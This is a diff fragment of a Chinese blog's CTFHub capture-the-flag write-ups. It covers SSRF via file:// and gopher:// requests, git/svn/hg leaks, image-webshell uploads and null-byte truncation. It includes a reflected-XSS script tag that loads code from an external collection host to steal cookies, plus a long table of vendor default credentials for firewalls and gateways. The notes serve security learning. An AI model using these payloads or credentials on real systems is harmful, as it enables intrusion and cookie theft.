+<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/flag.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>key<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token comment" spellcheck="true">&lt;!-- Debug: key=11e053e2b7900523ac51fc7606b964e2--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+</code></pre>
+<p>发现了一个<code>key</code>的参数</p>
+<pre><code>key=11e053e2b7900523ac51fc7606b964e2
+//key是不定的哈，不要全copy
+</code></pre>
+<p>我们把<code>key</code>值输入框中试试</p>
+<p><img src="/post/wp-CTFHub/image-20220925222739689.png" alt="image-20220925222739689"></p>
+<p>看来只能从本地<code>127.0.0.1</code>访问</p>
+<p>利用<code>file://</code>伪协议从本地方式访问文件看看<code>index.php</code>文件</p>
+<pre><code>http://challenge-177dcd6de76352cb.sandbox.ctfhub.com:10800/?url=file:///var/www/html/index.php
+</code></pre>
+<p>右键查看，</p>
+<p>得到<code>index.php</code>源码</p>
+<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
+
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">;</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: /?url=_"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    exit<span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>以相同方式看看<code>flag.php</code>文件</p>
+<pre class=" language-php+HTML"><code class="language-php+HTML"><?php
+
+error_reporting(0);
+
+if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") {;
+    echo "Just View From 127.0.0.1";
+    return;
+};
+
+$flag=getenv("CTFHUB");
+$key = md5($flag);
+
+if (isset($_POST["key"]) && $_POST["key"] == $key) {;
+    echo $flag;
+    exit;
+};
+?>
+
+<form action="/flag.php" method="post">
+<input type="text" name="key">
+<!-- Debug: key=<?php echo $key;?>-->
+</form>
+</code></pre>
+<p>根据<code>flag.php</code>最后的提示，</p>
+<p>尝试 <code>Gopher</code> 协议向服务器发送 <code>POST</code> 包</p>
+<pre><code> Gopher协议的格式:
+ 
+ gopher://IP:port/_TCP/IP数据流
+</code></pre>
+<p>先构造 <code>Gopher</code>协议所需的 <code>POST</code>请求：</p>
+<pre><code>POST /flag.php HTTP/1.1
+Host: 127.0.0.1:80
+Content-Length: 36          
+Content-Type: application/x-www-form-urlencoded
+
+key=11e053e2b7900523ac51fc7606b964e2
+
+//Content-Length 这个要和底下POST参数[包括key=,4个]长度一致
+</code></pre>
+<p>但是这里需要对其进行两次<code>url</code>编码</p>
+<p>根据<code>hint</code>，请求有<code>curl</code>功能</p>
+<p>在向服务器发送请求时，首先浏览器会进行一次 <code>URL</code>解码，</p>
+<p>其次服务器收到请求后，在执行<code>curl</code>功能时，进行第二次 <code>URL</code>解码</p>
+<p>因此需要两次<code>url</code>编码</p>
+<pre><code>`注`：
+在第一次编码后的数据中，将`%0A`全部替换为`%0D%0A`。
+
+因为 Gopher协议包含的请求数据包中，可能包含有`=`、`&amp;`等特殊字符，
+避免与服务器解析传入的参数键值对混淆，所以对数据包进行 URL编码，这样服务端会把`%`后的字节当做普通字节。
+</code></pre>
+<p><img src="/post/wp-CTFHub/image-20220925231951671.png" alt="image-20220925231951671"></p>
+<p>然后第二次编码</p>
+<p><img src="/post/wp-CTFHub/image-20220925232013164.png" alt="image-20220925232013164"></p>
+<p>得到</p>
+<pre><code>POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%252036%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250A%250D%250Akey%253D11e053e2b7900523ac51fc7606b964e2
+</code></pre>
+<p>然后又因为<code>flag.php</code>里有<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code></p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string">"Just View From 127.0.0.1"</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+</code></pre>
+<p>如果直接在输入框，上传POST请求又会显示</p>
+<p><img src="/post/wp-CTFHub/image-20220925222739689.png" alt="image-20220925222739689"></p>
+<p>这个想绕过，就只有通过<code>index.php</code>的<code>curl</code>功能，利用Gopher协议从<code>127.0.0.1</code>向目标发送<code>POST</code>请求</p>
+<pre><code>?url=gopher://127.0.0.1:80/_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%252036%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250A%250D%250Akey%253D11e053e2b7900523ac51fc7606b964e2
+</code></pre>
+<p><img src="/post/wp-CTFHub/image-20220925232055769.png" alt="image-20220925232055769"></p>
+<p>得到flag</p>
 ]]></content>
       <categories>
         <category>网络安全学习</category>
@@ -22697,513 +23204,6 @@ and share this screen shot and tag @KDSAMF
 <p>直接wget</p>
 <p><img src="/post/vulnhub/image-20230222153353400.png" alt="image-20230222153353400"></p>
 <h2 id="FLAG2"><a href="#FLAG2" class="headerlink" title="FLAG2"></a>FLAG2</h2><p><img src="/post/vulnhub/image-20230222153942426.png" alt="image-20230222153942426"></p>
-]]></content>
-      <categories>
-        <category>网络安全学习</category>
-      </categories>
-      <tags>
-        <tag>靶场</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTFHub-wp</title>
-    <url>//post/wp-CTFHub/</url>
-    <content><![CDATA[<p><code>做做笔记</code></p>
-<span id="more"></span>
-
-<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="1-密码口令"><a href="#1-密码口令" class="headerlink" title="1.密码口令"></a>1.密码口令</h2><h3 id="1）弱口令"><a href="#1）弱口令" class="headerlink" title="1）弱口令"></a>1）弱口令</h3><p>一般思维，</p>
-<p>用户名：admin，root</p>
-<p>密码：password，admin123，123456</p>
-<p>可以用<strong>top100字典</strong>（可以网上找一下）跑一下，但有的可能需要<strong>枚举法</strong></p>
-<p>比如<strong>admin888</strong>或者<strong>admin255</strong>这样的类似的，就需要在后面用枚举法找出，字典并没包含这种类似情况</p>
-<h3 id="2）默认口令"><a href="#2）默认口令" class="headerlink" title="2）默认口令"></a>2）默认口令</h3><p>就是系统默认的口令，在渗透测试过程中，最常见的情况就是遇到弱口令得到入口从而攻陷整个系统，由于很多系统管理员缺少安全意识，口令往往是系统默认设置的口令</p>
-<pre><code>常见网络安全设备弱口令(默认口令)
-设备    默认账号    默认密码
-深信服产品    sangfor    sangfor sangfor@2018 sangfor@2019
-深信服科技 AD        dlanrecover
-深信服负载均衡 AD 3.6    admin    admin
-深信服WAC ( WNS V2.6)    admin    admin
-深信服VPN    Admin    Admin
-深信服ipsec-VPN (SSL 5.5)    Admin    Admin
-深信服AC6.0    admin    admin
-SANGFOR防火墙    admin    sangfor
-深信服AF(NGAF V2.2)    admin    sangfor
-深信服NGAF下一代应用防火墙(NGAF V4.3)    admin    admin
-深信服AD3.9    admin    admin
-深信服上网行为管理设备数据中心    Admin    密码为空
-SANGFOR_AD_v5.1    admin    admin
-网御漏洞扫描系统    leadsec    leadsec
-天阗入侵检测与管理系统 V7.0    Admin    venus70
-Audit    venus70
-adm    venus70
-天阗入侵检测与管理系统 V6.0    Admin    venus60
-Audit    venus60
-adm    venus60
-网御WAF集中控制中心(V3.0R5.0)    admin    leadsec.waf
-audit    leadsec.waf
-adm    leadsec.waf
-联想网御    administrator    administrator
-网御事件服务器    admin    admin123
-联想网御防火墙PowerV    administrator    administrator
-联想网御入侵检测系统    lenovo    default
-网络卫士入侵检测系统    admin    talent
-网御入侵检测系统V3.2.72.0    adm    leadsec32
-admin    leadsec32
-联想网御入侵检测系统IDS    root    111111
-admin    admin123
-科来网络回溯分析系统    csadmin    colasoft
-中控考勤机web3.0    administrator    123456
-H3C iMC    admin    admin
-H3C SecPath系列    admin    admin
-H3C S5120-SI    test    123
-H3C智能管理中心    admin    admin
-H3C ER3100    admin    adminer3100
-H3C ER3200    admin    adminer3200
-H3C ER3260    admin    adminer3260
-H3C    admin    adminer
-admin    admin
-admin    h3capadmin
-h3c    h3c
-360天擎    admin    admin
-网神防火墙    firewall    firewall
-天融信防火墙NGFW4000    superman    talent
-黑盾防火墙    admin    admin
-rule    abc123
-audit    abc123
-华为防火墙    telnetuser    telnetpwd
-ftpuser    ftppwd
-方正防火墙    admin    admin
-飞塔防火墙    admin    密码为空
-Juniper_SSG__5防火墙    netscreen    netscreen
-中新金盾硬件防火墙    admin    123
-kill防火墙(冠群金辰)    admin    sys123
-天清汉马USG防火墙    admin    venus.fw
-Audit    venus.audit
-useradmin    venus.user
-阿姆瑞特防火墙    admin    manager
-山石网科    hillstone    hillstone
-绿盟安全审计系统    weboper    weboper
-webaudit    webaudit
-conadmin    conadmin
-admin    admin
-shell    shell
-绿盟产品        nsfocus123
-TopAudit日志审计系统    superman    talent
-LogBase日志管理综合审计系统    admin    safetybase
-网神SecFox运维安全管理与审计系统    admin    !1fw@2soc#3vpn
-天融信数据库审计系统    superman    telent
-Hillstone安全审计平台    hillstone    hillstone
-网康日志中心    ns25000    ns25000
-网络安全审计系统（中科新业）    admin    123456
-天玥网络安全审计系统    Admin    cyberaudit
-明御WEB应用防火墙    admin    admin
-admin    adminadmin
-明御攻防实验室平台    root    123456
-明御安全网关    admin    adminadmin
-明御运维审计与册风险控制系统    admin    1q2w3e
-system    1q2w3e4r
-auditor    1q2w3e
-operator    1q2w3e4r
-明御网站卫士    sysmanager    sysmanager888
-亿邮邮件网关    eyouuser    eyou_admin
-eyougw    admin@(eyou)
-admin    +-ccccc
-admin    cyouadmin
-Websense邮件安全网关    administrator    admin
-梭子鱼邮件存储网关    admin    admin
-</code></pre>
-<h2 id="2-信息泄露-备份文件下载"><a href="#2-信息泄露-备份文件下载" class="headerlink" title="2.信息泄露-备份文件下载"></a>2.信息泄露-备份文件下载</h2><p><img src="/post/wp-CTFHub/image-20220919213733369.png" alt="image-20220919213733369"></p>
-<h2 id="2-1-信息泄露-robots-txt"><a href="#2-1-信息泄露-robots-txt" class="headerlink" title="2.1 信息泄露-robots.txt"></a>2.1 信息泄露-robots.txt</h2><pre><code>访问url/robots.txt
-</code></pre>
-<p>查看爬虫协议</p>
-<h2 id="2-2-信息泄露-bak文件"><a href="#2-2-信息泄露-bak文件" class="headerlink" title="2.2 信息泄露-bak文件"></a>2.2 信息泄露-bak文件</h2><pre><code>访问url/文件名.后缀名.bak
-</code></pre>
-<p>下载bak（备份文件）</p>
-<h2 id="2-3-信息泄露-vim缓存"><a href="#2-3-信息泄露-vim缓存" class="headerlink" title="2.3 信息泄露-vim缓存"></a>2.3 信息泄露-vim缓存</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在使用<code>vim</code>时会创建临时缓存文件，关闭<code>vim</code>时缓存文件则会被删除，当<code>vim</code>异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p>
-<p>以 <code>index.php</code> 为例：<br><strong>第一次</strong>产生的交换文件名为 <code>.index.php.swp</code></p>
-<p><strong>再次意外退出</strong>后，将会产生名为 <code>.index.php.swo</code> 的交换文件</p>
-<p><strong>第三次产生</strong>的交换文件则为 <code>.index.php.swn</code><br>作用</p>
-<p><u>可用来恢复意外退出的文件</u></p>
-<h3 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h3><p><code>SWP</code>文件为隐藏文件，操作时需要在文件名前加.</p>
-<p>针对<code>SWP</code>备份文件，我们可以使用<code>vim -r filename</code>命令来恢复文件<br>(<code>vim</code>使用的缓存存储为一种固定格式的二进制文件。而我们一般编辑的时明问可见字符，在vim的缓存中这些可见字符会原样保留,所以显示是一种乱码)<br>根据提示按回车进行恢复</p>
-<h2 id="2-4-信息泄露-DS-Store"><a href="#2-4-信息泄露-DS-Store" class="headerlink" title="2.4 信息泄露-.DS_Store"></a>2.4 信息泄露-.DS_Store</h2><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot="">
-<path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path>
-<path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path>
-<path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path>
-<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path>
-<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path>
-<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path>
-<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path>
-</svg>
-</span><p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p></blockquote>
-<pre><code>访问url/.DS_Store
-</code></pre>
-<p>下载<code>DS_Store</code>文件</p>
-<h2 id="3-信息泄露-Git泄露-log"><a href="#3-信息泄露-Git泄露-log" class="headerlink" title="3.信息泄露-Git泄露-log"></a>3.信息泄露-Git泄露-log</h2><p> 第一次使用<strong>githack</strong>，记录一下</p>
-<p><strong>注意githack需要python2.7版本</strong></p>
-<p><code>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</code></p>
-<p><code>GitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建工程源代码。</code></p>
-<h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>1、解析<code>.git/index</code>文件，找到工程中所有的： ( 文件名，文件sha1 )<br>2、去<code>.git/objects/</code> 文件夹下下载对应的文件<br>3、<code>zlib</code>解压文件，按原始的目录结构写入源代码</p>
-<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>速度快，默认20个工作线程<br>尽量还原所有的源代码，缺失的文件不影响脚本工作<br>脚本不需要执行额外的git命令，<code>all you need is python</code><br>脚本无需浏览目录</p>
-<h3 id="用法示例"><a href="#用法示例" class="headerlink" title="用法示例"></a>用法示例</h3><p>注意这里在url后面需要加上.git，用dirsearch可以扫出来（python3）</p>
-<pre><code>GitHack.py http://www.openssl.org/.git/
-</code></pre>
-<p>然后在目录<code>dist</code>就会生成对应目录 </p>
-<p>打开目录，输入<code>cmd</code>，执行<code>git log</code>【<code>git log</code> 可以查看<code>commit history</code>，也就是命令执行的历史，可以看看之前执行过哪些命令，方便后面查询命令执行的具体内容】</p>
-<p><img src="/post/wp-CTFHub/image-20220728230330073.png" alt="image-20220728230330073"></p>
-<p>然后复制<code>add flag</code>这个命令的代码，如上图<code>75272ca078b7eedcf329a2b08f6e4faae0a36a99</code></p>
-<p>然后用<code>git diff</code></p>
-<p>【</p>
-<p>git diff比较两个版本的差异，</p>
-<p>这里后面只有<strong>一个命令</strong>就是比较本地工作区和缓存区的信息区别</p>
-<p>如果后面有<strong>两个命令</strong>，就是比较这两个命令的差别</p>
-<p>】</p>
-<p><img src="/post/wp-CTFHub/image-20220728231134513.png" alt="image-20220728231134513"></p>
-<p>这里比较，就得到了<code>flag</code></p>
-<h2 id="4-信息泄露-Git泄露-Stash"><a href="#4-信息泄露-Git泄露-Stash" class="headerlink" title="4.信息泄露-Git泄露-Stash"></a>4.信息泄露-Git泄露-Stash</h2><h3 id="git-stash-的作用"><a href="#git-stash-的作用" class="headerlink" title="git stash 的作用"></a>git stash 的作用</h3><p>git stash用于想要保存当前的修改,但是想回到之前最后一次提交的干净的工作仓库时进行的操作.git stash将本地的修改保存起来,并且将当前代码切换到HEAD提交上.</p>
-<p>通过git stash存储的修改列表,可以通过<u><strong>git stash list</strong></u>查看.<u><strong>git stash show</strong></u>用于校验,<u><strong>git stash apply</strong></u>用于重新存储.直接执行<u><code>git stash</code>等同于<code>git stash save.</code></u></p>
-<p>最新的存储保存在<code>refs/stash</code>中老的存储可以通过相关的参数获得,例如<code>stash@&#123;0&#125;</code>获取最新的存储,stash@{1}获取次新<code>.stash@&#123;2.hour.ago&#125;</code>获取两小时之前的.存储可以直接通过索引的位置来获得<code>stash@&#123;n&#125;</code>.</p>
-<p>操作同<code>2.log</code></p>
-<p>可以先用<code>dirsearch</code>扫一下， 发现<code>refs/stash</code>文件，</p>
-<p>然后用<code>GitHack</code>扫描</p>
-<p>在生成文件夹里有<code>stash</code>文件</p>
-<pre><code>`D:\GitHack-master\dist\challenge-8d48663e236c2ebc.sandbox.ctfhub.com_10800\.git\refs`
-</code></pre>
-<p><img src="/post/wp-CTFHub/image-20220729115457869.png" alt="image-20220729115457869"></p>
-<p>打开看到</p>
-<p><img src="/post/wp-CTFHub/image-20220729115528299.png" alt="image-20220729115528299"></p>
-<p>在生成的文件夹下用</p>
-<pre><code>git diff d8c1978b1e71300574e1bb5335a01124b3a55569
-</code></pre>
-<p>得到<code>flag</code></p>
-<p>【也可以使用 <code>git bash</code>，直接在生成的文件夹下</p>
-<p>执行<code>git stash list</code> </p>
-<pre><code>查看stash了哪些存储
-</code></pre>
-<p>然后执行<code>git stash pop</code></p>
-<pre><code>恢复之前缓存的工作目录，将缓存堆栈中的对应stash删除，
-并将对应修改应用到当前的工作目录下,默认为第一个stash,即stash@&#123;0&#125;，
-
-如果要应用并删除其他stash，命令：git stash pop stash@&#123;$num&#125; ，
-比如应用并删除第二个：git stash pop stash@&#123;1&#125;）
-</code></pre>
-<p>然后会在该目录下生成一个新的<code>txt</code>文件，打开或用<code>cat</code>命令，得到<code>flag</code></p>
-<p>】</p>
-<h2 id="5-信息泄露-SVN泄露"><a href="#5-信息泄露-SVN泄露" class="headerlink" title="5.信息泄露-SVN泄露"></a>5.信息泄露-SVN泄露</h2><p><code>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</code></p>
-<p>这道题需要运用<code>dvcs-ripper</code>工具进行处理</p>
-<p>可以先用<code>dirsearch</code>扫出<code>.svn</code>目录，说明有<code>SVN</code>泄露</p>
-<p>和<code>githack</code>类似，</p>
-<pre><code>./rip-svn.pl -v -u url/.svn
-</code></pre>
-<p>然后在dvcs-ripper目录里，进入.svn目录</p>
-<p><img src="/post/wp-CTFHub/image-20220729175208298.png" alt="image-20220729175208298"></p>
-<p>然后进入pristine目录，进去发现两个目录，挨个打开</p>
-<p><img src="/post/wp-CTFHub/image-20220729175252045.png" alt="image-20220729175252045"></p>
-<p><img src="/post/wp-CTFHub/image-20220729175429878.png" alt="image-20220729175429878"></p>
-<p>发现一个目录下是网站页面源码，另一个就是<code>flag</code></p>
-<p>得到<code>flag</code></p>
-<h2 id="6-信息泄露-HG泄露"><a href="#6-信息泄露-HG泄露" class="headerlink" title="6.信息泄露-HG泄露"></a>6.信息泄露-HG泄露</h2><pre><code>`当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。`
-</code></pre>
-<p>可以先用<code>dirsearch</code>扫出<code>.hg</code>目录，说明有<code>HG</code>泄露</p>
-<p>这个和<code>SVN</code>一样，只不过要改成<code>.hg</code></p>
-<pre><code>./rip-hg.pl -v -u url/.hg
-</code></pre>
-<p><img src="/post/wp-CTFHub/image-20220730164340016.png" alt="image-20220730164340016"></p>
-<p>发现两个文件，猜测为<code>HG</code>泄露文件</p>
-<p><img src="/post/wp-CTFHub/image-20220730164428184.png" alt="image-20220730164428184"></p>
-<p>发现<code>flag</code>文本文件</p>
-<p><img src="/post/wp-CTFHub/image-20220730164949862.png" alt="image-20220730164949862"></p>
-<p><code>url+flag_973127138.txt</code></p>
-<p>得到<code>flag</code></p>
-<h2 id="7-xss-xss反射型"><a href="#7-xss-xss反射型" class="headerlink" title="7.xss-xss反射型"></a>7.xss-xss反射型</h2><p>发现它有两个输入框</p>
-<p><img src="/post/wp-CTFHub/image-20220731104635854.png" alt="image-20220731104635854"></p>
-<p>第一个输入测试语句，成功弹窗</p>
-<p>第二个是发送<code>url</code>，盲猜是发到后台</p>
-<p>看了一些<code>wp</code>，发现需要使用<code>xss</code>测试平台<code>http://xsscom.com//index.php</code></p>
-<p>先创建项目</p>
-<p><img src="/post/wp-CTFHub/image-20220731113619175.png" alt="image-20220731113619175"></p>
-<p>设置配置</p>
-<p><img src="/post/wp-CTFHub/image-20220731113753893.png" alt="image-20220731113753893"></p>
-<p>然后点击查看代码</p>
-<p><img src="/post/wp-CTFHub/image-20220731113810045.png" alt="image-20220731113810045"></p>
-<p>在最下面看到</p>
-<p><img src="/post/wp-CTFHub/image-20220731113837566.png" alt="image-20220731113837566"></p>
-<p>把代码</p>
-<pre><code>&lt;/textarea&gt;&#39;&quot;&gt;&lt;script src=http://xsscom.com//9VJcMV&gt;&lt;/script&gt;
-</code></pre>
-<p>输入到第一个框中</p>
-<p>再把提交后的url复制，然后到第二框中发送</p>
-<p><img src="/post/wp-CTFHub/image-20220731114028909.png" alt="image-20220731114028909"></p>
-<p>然后返回xss测试平台上查看</p>
-<p><img src="/post/wp-CTFHub/image-20220731114142138.png" alt="image-20220731114142138"></p>
-<p><code>cookie</code>处出现<code>flag</code></p>
-<h2 id="8-文件上传-文件头检查"><a href="#8-文件上传-文件头检查" class="headerlink" title="8.文件上传-文件头检查"></a>8.文件上传-文件头检查</h2><p><code>文件头是直接位于文件中的一段数据,是文件的一部分</code></p>
-<p>这里过滤文件头，而且限制图片类型文件，所以可以试试上传一个没有任何问题的图片【注意图片不能太大，不然会最后用蚁剑连接会爆错，我上传1mb大小图片就报错，最后上传400字节图片才成功】</p>
-<p><img src="/post/wp-CTFHub/image-20220731164210465.png" alt="image-20220731164210465"></p>
-<p>上传图片后，在后面加上一句话木马，并修改文件名</p>
-<pre><code>【也可以用cmd 合成图片马，也是有图片文件头】
-
-【copy 图片名.png(.jpg)/b + 木马文件名.php(.asp/.aspx)/a 生成图片名.png(.jpg)】
-
-【已试可行】
-</code></pre>
-<p><img src="/post/wp-CTFHub/image-20220731164732820.png" alt="image-20220731164732820"></p>
-<p>然后正常用蚁剑连接</p>
-<p><img src="/post/wp-CTFHub/image-20220731164330254.png" alt="image-20220731164330254"></p>
-<p>得到<code>flag</code></p>
-<h2 id="9-文件上传-00截断"><a href="#9-文件上传-00截断" class="headerlink" title="9.文件上传-00截断"></a>9.文件上传-00截断</h2><h3 id="0x00截断原理：-php"><a href="#0x00截断原理：-php" class="headerlink" title="0x00截断原理：[php&lt;5.3.29]"></a>0x00截断原理：[php&lt;5.3.29]</h3><pre><code>0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当做结束符。系统在对文件名的读取时，如果遇到0x00，就会认为读取已结束。这个可以用在对文件类型名的绕过上。
-
-但要注意是文件的16进制内容里的00，而不是文件名中的00 ！！！就是说系统是按16进制读取文件（或者说二进制），
-
-遇到ascii码为零的位置就停止，而这个ascii码为零的位置在16进制中是00，用0x开头表示16进制，也就是所说的0x00截断。
-
-%00是被服务器解码为0x00发挥了截断作用。
-</code></pre>
-<p><code>举个例子，url中输入的是upload/post.php%00.png，看样子是图片文件，那么后台读取到是upload/post.php，就实现了绕后目的。</code></p>
-<p>我们开始先上传一个文件试试，限制<code>jpg,png,gif</code>后缀</p>
-<p>上传成功后，没有显示上传路径，只是url变化</p>
-<p><code>http://challenge-6cc6a23c8f284d6b.sandbox.ctfhub.com:10800/?road=/var/www/html</code></p>
-<p> 猜想多半重新临时文件名，不固定，导致显示不了路径</p>
-<p>这里就需要<code>00截断</code>，要把文件上传的路径，找到，好用蚁剑连接</p>
-<p>先要清楚<code>%00</code>截断点在哪里，我们先F12看</p>
-<p>看网站源码</p>
-<pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
-
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>CTFHub 文件上传 - 00截断<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
-
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>CTFHub 文件上传 - 00截断<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
-    &lt;form action=?road=/var/www/html/upload/ method="post" enctype="multipart/form-data">
-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Filename:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
